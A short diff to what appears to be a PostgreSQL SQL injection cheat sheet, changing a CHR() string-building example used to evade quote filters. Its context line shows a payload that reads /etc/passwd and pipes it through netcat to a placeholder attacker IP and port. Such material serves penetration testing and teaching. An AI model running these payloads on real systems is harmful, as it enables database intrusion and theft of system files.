@@ -258,7 +258,7 @@ SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
 Using CHR
 
 ```sql
-SELECT CHR(65)||CHR(66)||CHR(67);
+SELECT CHR(39)||CHR(105)||CHR(64)||CHR(39); 
 ```
 
 Using Dollar-signs  ( >= version 8 PostgreSQL)
